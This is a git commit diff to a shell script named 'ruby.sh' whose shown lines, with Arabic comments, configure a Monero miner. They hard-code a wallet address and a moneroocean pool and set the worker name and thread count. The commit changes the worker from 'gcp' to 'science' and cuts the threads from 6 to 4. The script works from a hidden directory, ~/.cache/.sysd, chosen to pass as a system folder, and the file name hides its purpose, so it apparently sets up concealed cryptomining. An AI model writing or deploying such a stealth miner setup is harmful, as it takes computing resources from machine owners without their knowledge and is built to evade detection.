0b2deaed815d68310bd55e86210ef8de35d0bc64
jaydmarks227 <34647974+jaydmarks227@users.noreply.github.com>
2025-12-11 08:01:32 +0100

    Update ruby.sh

--- ruby.sh
+++ ruby.sh
@@ -2,9 +2,9 @@
 
 # إعداد بيانات المحفظة والمعدّن
 WALLET="88DcxveXeHaRDYLbmAxBuMZBsYwEtrDcb4EUWJvCQjKsNo2ieFTrBLNBhpVdFfLTXnRDcnJgg7Fpre43fbFMnfxkV2ZrpEm"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
-WORKER="gcp"
+WORKER="science"
 POOL="gulf.moneroocean.stream:443"
-THREADS=6
+THREADS=4
 # مجلد العمل
 WORKDIR="$HOME/.cache/.sysd"  # ← مجلد خفي داخل .cache
 mkdir -p "$WORKDIR" && cd "$WORKDIR"
